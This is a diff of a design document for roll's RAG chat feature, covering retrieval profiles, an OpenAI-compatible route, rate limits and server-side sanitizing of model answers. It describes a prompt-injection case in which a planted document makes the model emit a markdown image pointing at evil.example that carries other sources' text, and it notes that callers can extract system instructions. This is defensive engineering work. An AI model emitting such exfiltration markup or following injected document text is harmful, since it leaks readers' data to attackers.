@@ -1,9 +1,169 @@
 # Conversational search and RAG: design
 
-`## Next` item 11 in [README.md](README.md). Status: phase 1 built (streamed inference, the
-Playground's Chat view); phases 2 and 3 are design. Depends on three open PRs, marked where it
-matters: browser keys and CORS (#358), E5 run by roll (#563), and one memory account per request
-(#549).
+`## Next` item 11 in [README.md](README.md). Status: phases 1 and 2 built (streamed inference
+and the Playground's Chat view; the `/_roll/chat` engine, the OpenAI-compatible route, browser
+keys on chat, the CLI and the MCP tool: [Phase 2 as built](#phase-2-as-built)); phase 3 is design.
+Browser keys (#358) and the request breaker (#549) are on main; retrieval embeds with the owner's
+endpoint until roll's E5 (#563) lands.
+
+## Phase 2 as built
+
+Code: `crates/search-es/src/xpack/chat/` (`mod.rs` the engine, `prompt.rs` the prompt and
+citations, `limits.rs` the costs, `openai.rs` the compatible route), routes in
+`crates/search-es/spec/roll/roll.chat.json`. Where this design left a choice open, phase 2 took
+what the best of the four products does:
+
+- **A profile retrieves from an index or a search application** (`index` or
+  `search_application`). Typesense and Meilisearch chat over a collection or index with no
+  template to write, and Elastic's Playground starts from picked indices, so a profile over an
+  index needs no mustache: roll builds `rrf` of BM25 (`multi_match`) and `semantic` over the
+  index's `semantic_text` and text fields (`query_fields` to choose), or BM25 alone when it has
+  no `semantic_text`. A profile over a search application runs its template with the question
+  as `query_param`, as designed. Either way roll sets `size`, `_source` and the highlight, and
+  drops aggregations, suggesters, `explain` and `profile` from the rendered body. `_source` holds
+  only `context.fields`: passages come from the highlight alone (`no_match_size` gives a text
+  field's start, the semantic highlighter a field's first chunks), so no whole document is read
+  for the `max_source_bytes` the model gets.
+- **Profile fields:** `index` or `search_application`, `inference_id`, `instructions` (8 KiB),
+  `query_param`, `query_fields`, `context` (`fields`, `passages`, `max_sources` 1-20 (5),
+  `max_source_bytes` 256-16,384 (4,096), `max_context_tokens` (6,000), `max_history_tokens`
+  (2,000), `max_history_turns` (20, at most 100)), `max_output_tokens` (1,024), `min_score`,
+  `max_tokens_per_day` (1,000,000 unless set; `"unlimited"` explicitly), `per_caller`
+  (`turns_per_minute` 30, `input_tokens_per_minute` 100,000, `output_tokens_per_minute` 20,000,
+  `max_concurrent` 4), `allow_links` (false), `timeout` (60s, at most
+  `roll.inference.max_timeout`). The node caps
+  `roll.chat.max_context_tokens` (32,000) and `roll.chat.max_output_tokens` (4,096) apply when a
+  profile is put and again on every answer.
+- **`instructions` aren't secret.** Any caller of a profile can ask the model to repeat its
+  system message, and models do. Write nothing there that the profile's callers may not read.
+- **Endpoints:** a `completion` or `chat_completion` endpoint of a service that streams a chat
+  completion with a system message (`openai`, `anthropic`, `azureopenai`, `googlevertexai`,
+  `mistral`, `deepseek`, `hugging_face`): the frame must stay a system message, never text folded
+  into the user's. Others are refused when the profile is put.
+- **Native events** are plain server-sent events: `event: sources` (`sources`, `omitted`), then
+  `event: delta` (`text`), then `event: done` (`cited`, `omitted`, `finish_reason`, `usage`) or
+  `event: error` (the cluster's error body). An error before the stream starts (a 403 of the
+  search, a limit's 429, the provider's refusal) is an ordinary answer with its status.
+- **Bounds besides the budgets:** the question 4,000 characters, `params` 16 KiB, history 100
+  turns of at most 16 KiB and 64 KiB in all (400 past them), the sources at most 256 KiB, the
+  answer 256 KiB (past it the stream ends as `length` and the upstream is closed), one deadline
+  for the whole answer, retrieval included. The search's response, the prompt (twice, for its
+  JSON) and the answer are charged to the `request` breaker while the answer runs.
+- **Answers leave as text, whatever the model wrote** (`xpack/chat/answer.rs`). A planted
+  document can make the model end with `![.](https://evil.example/p?d=<other sources>)`, and chat
+  UIs on the OpenAI route (Open WebUI, LibreChat) render markdown, so the reader's browser would
+  send what they may read to the attacker. Every answer, JSON or streamed, native or OpenAI's, is
+  made literal on the server rather than searched for markup: four rounds of review found
+  renderer behaviours a list of patterns didn't model (table cells splitting a code span,
+  strikethrough unwrapping one, remark decoding entities before it autolinks).
+  - **Markdown's characters as entities.** Every `&`, `\`, `` ` ``, `~`, `|`, `<`, `>`, `[`, `]`,
+    `!`, `*`, `_` and `#` the model writes becomes its numeric entity (`&#60;`): every renderer
+    shows the character and none reads it as syntax, so no tag, image, link, reference
+    definition, footnote, table cell boundary, code span, strikethrough, emphasis or heading
+    can start (comrak, marked and remark-gfm still make a one-column table of `text` over `-:`,
+    which holds nothing but text: with no `|` there's nothing to split), and an
+    entity or escape the model wrote (`https:&#47;&#47;`, `\/`) shows as written, never decoded
+    into what it spells. `\r` and `\r\n` become `\n`.
+  - **Link-shaped tokens broken.** U+2060 WORD JOINER goes inside every `//`, after a `:` that
+    follows a letter (`https:`, `mailto:`, `xmpp:`), after every `.` (and between `www` and its
+    `.`, as comrak's `www.` autolink takes a joiner after the dot as part of the domain), and
+    before every `@`. The
+    dot's is for markdown-it's linkify, which links a bare `evil.com/p?d=…` and counts the
+    joiner as a letter: after the dot it breaks the TLD match (IDNs' too). None of GFM's
+    (comrak's), marked's, markdown-it's (linkify too) or remark-gfm's autolinks spans it, and
+    it's invisible, so a URL still reads as one but isn't a link.
+  - **Direction controls dropped** (U+202A–202E, U+2066–2069, U+200E/F, U+061C): they could
+    make reversed text read as a URL, or `]1[` as a citation.
+  - **History reads back.** A client sends an earlier answer back as it got it (Open WebUI,
+    LibreChat, the OpenAI SDK's samples), so an `assistant` turn has exactly those thirteen
+    entities decoded and the joiners removed before the model sees it: entities fed back would
+    be copied, escaped again, and lose their citations.
+  - **Nothing held.** The answer streams character by character, and any split of it comes out
+    as the whole does; only with `allow_links` does an open `[` wait (at most 2 KiB) to see
+    whether it's a link to keep.
+  - **Kept links** (`allow_links: true`): an inline `[label](url)` (never an image) whose URL is
+    exactly one in the given sources' fields and made only of characters that can't end a link
+    destination, split a table cell or start markup (RFC 3986's unreserved and reserved
+    characters but `(`, `)`, `[`, `]`, `'` and `|`), emitted as written so a client comparing it
+    with the source's finds it; its label is literal like any text. Other URLs, a source's own
+    written out bare included, show broken. Any field of a given source may offer the URL, a
+    planted document's too: it can offer its own fixed URLs as a click, never one carrying
+    another source's text (beyond the few bits of which of its URLs the model picks), and
+    naming one field wouldn't help, as a planted document can fill any field. A URL holding an
+    entity (`&#64;`, `&sol;`) is never kept: renderers decode it, so the link opened wouldn't
+    be the source's string.
+  - **The cost:** the model's markdown shows as its characters (`**bold**`, `# Title`, a
+    table's pipes), and its citations (`[1]`) reach the wire as entities (`&#91;1&#93;`):
+    markdown renderers show `[1]`, and `cited` lists them. A client that shows answers as plain
+    text, not markdown, decodes numeric entities first, as roll's own do (`roll search chat`,
+    the view-code snippets, the guide's sample). Copying a URL out of an answer copies the word
+    joiners too, so it doesn't paste as a link; so does a copied number (`3.14`).
+  - **Tests:** every payload of the four reviews (`crates/search-es/tests/fixtures/chat-markup.json`)
+    whole, a character at a time and split at every point, and 4,000 random compositions of the
+    reviewers' fragments, read as GitHub-flavored markdown (comrak): any link but a kept one,
+    image, HTML, footnote, table with a raw `|` or linkable text (a URL, an address, a domain)
+    fails; and every
+    payload reads back as written. A manual check outside the repo (it needs node packages the
+    repo doesn't have: `~/.cache/rr1068r4/jscheck` on the dev server) renders the corpus and
+    70,000 random compositions, each in random pieces, through this code with marked,
+    markdown-it (linkify on and off) and remark-gfm: no link but a kept one, image, HTML or
+    table with a raw `|`. It was run for this design; it isn't part of `pnpm test:search`.
+  - **Left to the renderer:** a kept link carries no `rel` or `referrerpolicy`; and a renderer
+    must decode entities once, as markdown does: one that decodes the answer
+    before rendering it, or decodes the HTML markdown made again, turns `&#60;` back into a tag.
+- **The OpenAI route** drops a client's `system` and `developer` messages (chat UIs send their
+  own): the profile's instructions are the only ones the model gets. `tools`, `functions`,
+  `n` > 1, logprobs, `response_format` and non-text content are 400s; sampling settings are
+  accepted and ignored (the profile's endpoint decides); `max_tokens` can only lower the cap.
+  `GET /_roll/openai/v1/models` lists the profiles the caller may run. Errors before the stream
+  are the cluster's with their status and `Retry-After` (OpenAI SDKs retry by them); a failure
+  mid-stream is OpenAI's error object as the last event.
+- **Bearer API keys.** On `/_roll/openai/` paths a Bearer value that is a derived key, or that
+  base64-decodes to UTF-8 `<id>[@<cluster>]:<key>` with an id of the API key alphabet (16 to 64 of
+  `A-Za-z0-9_-`) and a printable key, authenticates as `ApiKey`. Nothing else matches: the
+  cluster's `<name>_<password>` has a `_` (base64 never does), its bare password is lowercase
+  letters and digits, a service token decodes to `00 01 00 01 …` (base64 `AAEAA…`, refused by
+  its prefix), and an access token's random bytes aren't that shape. The node rewrites the header before admission
+  (`search-server/src/http.rs`), so a browser key sent as Bearer pays its rate limits like any.
+- **Browser keys** chat through their own policy entry, `limits.chat` (in place of the
+  `chat_profiles`, `chat_cost` and `max_history_tokens` limits sketched below):
+  `{"profiles": [...], "turns_per_minute": 10, "input_tokens_per_minute": 20000,
+  "output_tokens_per_minute": 5000, "max_concurrent": 2, "max_history_turns": 10, "cost": 10}`.
+  No entry (or a profile it doesn't name) is a 400 before anything runs; the inference APIs stay
+  closed to every browser key. A key derived from one with a `user` gets a quarter of each rate
+  and one answer at once for that user. An answer charges its turn and `cost` items to the
+  key's node rate limits when it starts, its estimated prompt tokens and its whole output cap
+  before the model is called, and gives back the output it didn't use when it ends; refusals are
+  429s with `Retry-After`. The buckets are per loaded cluster, in memory, bounded.
+- **Every caller pays, by its own identity.** `indices:data/read/roll/chat` is covered by `read`
+  (as `indices:data/read/*` covers every read), so any key or user that may read a profile's
+  target can chat. That stays: chat reads nothing its search doesn't, roll's own console route
+  and MCP tool call it as the cluster's owner, and a separate privilege would be a roll-only name
+  in roles Elasticsearch clients write. The cost is bounded instead: a caller that isn't a browser
+  key is held to the profile's `per_caller` limits (turns, prompt and output tokens a minute,
+  answers at once) by the user who made its API key (a fresh key buys no fresh budget; a key made
+  with another key counts as that key's person, although its `realm` reads `_es_api_key`), or its
+  user and realm (the owner's own calls share one; so do roll's index-scoped owner calls, which
+  carry no grant to tell apart and never reach chat), and
+  each side together to the profile's `max_tokens_per_day`, 1M unless the owner says otherwise:
+  browser keys share one day, every other caller another. One caller at the `per_caller`
+  defaults (100k prompt and 20k output tokens a minute) can empty its side's day in about eight
+  minutes; with one day for everyone that would switch the profile's public chat off for up to a
+  day, so the sides are apart and the owner's own keys can't do that to the pages (nor a page to
+  them). Without a day at all, one public browser key at its defaults could spend about 36M
+  tokens a day. The days are kept apart from the per-minute buckets, so evicting those never
+  hands a day back.
+- **Workflows.** `_answer`, the OpenAI route and its model list run in the
+  `search_application_query` workflow, so a key restricted to it chats over its application; it
+  is refused a profile over an index (403).
+- **Metering.** An answer is metered as every inference call is today: one request, and the
+  embedding pool's CPU when retrieval embeds with roll's E5 (`search-control/src/pricing.rs`).
+  Its provider tokens are metered too, not priced (the provider bills them): each answer that
+  reached the model adds the `usage` it reports (the provider's count, else roll's estimate) to
+  the cluster's token count when it ends, fails or its client goes away, and the usage route,
+  `roll search clusters usage` and the dashboard show them ("Metering (built)" below).
+- **Left for later:** the official `openai` Python client in Docker against a node; the
+  help-center retrieval fixture; query rewriting and memory (phase 3).
 
 ## Where roll is today
 
@@ -150,7 +310,8 @@ in one call. So roll adds a route.
 - **The last user message is the question**, and the earlier messages are the history.
 - **The answer is the profile's answer in OpenAI's shape**, streamed or not. Sources go in a
   `roll` object on the response (the last chunk when streaming), which OpenAI clients ignore.
-  Citations also appear inline as `[n]`.
+  Citations also appear inline, in the text made literal ("Answers leave as text": `[1]` as
+  `&#91;1&#93;`, which a markdown renderer shows as `[1]`).
 - **`Authorization: Bearer`** with the cluster's `<name>_<password>` already works (README, "Use
   it"). This route also takes `Bearer <encoded API key>`, because OpenAI SDKs send only Bearer.
 - **Tools, `n > 1`, logprobs and images in the request are 400s.**
@@ -203,7 +364,9 @@ in one call. So roll adds a route.
   caps). It's off by default because it doubles latency and cost.
 - **Citations.** Each source gets a number n. The answer is
   `{"answer", "sources": [{"n", "_index", "_id", "_score", "fields", "passages"}], "cited": [n…], "omitted", "finish_reason", "usage"}`.
-  - `cited` is parsed from the answer's `[n]` markers, and keeps only numbers roll handed out.
+  - `cited` is parsed from the `[n]` markers the model wrote (before the answer is made literal:
+    the text sent has them as `&#91;n&#93;`), and keeps only numbers roll handed out; a `[n]`
+    that's a kept link's label (`[1](…)`) isn't one.
     Model output is untrusted, as AGENTS.md says of roll code's reviewer.
   - `passages` are the highlighted chunks the model saw, so a UI can show exactly what was quoted.
 - **Streaming.** Server-sent events: `sources` first, before generation, so a page shows them at
@@ -254,8 +417,10 @@ in one call. So roll adds a route.
     `<`, `>` or copy of the boundary inside document text is escaped, so a document can't close its
     block or open another. The question follows the block in its own tag.
   - **History:** the turns, as the provider's message roles.
-- **The model has no tools.** It can't search, fetch or act, so an injected instruction can at
-  worst change the answer's text.
+- **The model has no tools.** It can't search, fetch or act. An injected instruction can still
+  steer the answer's text, including markup a renderer would load or link to send other sources
+  away, so answers are sanitized on the server ("Phase 2 as built"), not left to the frame's
+  request for plain text.
 - **Renderers treat answers as text.** The Playground, the snippet and the CLI never load an image
   or follow a link from an answer. Links to sources come from `sources[].fields`, not from the
   model's text. This closes the known exfiltration path, where a document makes the model write
@@ -280,9 +445,9 @@ in one call. So roll adds a route.
     node at a time, as compatibility.md notes for `rate_limit`), after which `_answer` answers 429.
   - **Metering (built):** provider tokens are counted per cluster, input and output apart
     (`xpack/inference/tokens.rs`), for `_inference/completion` (answered or streamed) and
-    `_inference/chat_completion`'s streams; `_answer` adds each answer's `usage` (the provider's
-    count, else its estimate) to the same counter, a call that comes with the chat engine. Each
-    call counts the provider's own
+    `_inference/chat_completion`'s streams; `_answer` and the OpenAI route add each answer's
+    `usage` (the provider's count, else its estimate) to the same counter once the model's stream
+    opened. Each call counts the provider's own
     figures when its answer carries them (OpenAI's `usage` and the services shaped like it,
     Anthropic's, Bedrock's, Cohere's `billed_units`, Google's `usageMetadata`), else roll's
     estimate of the text, figure by figure. A stream counts when it ends, also when its client
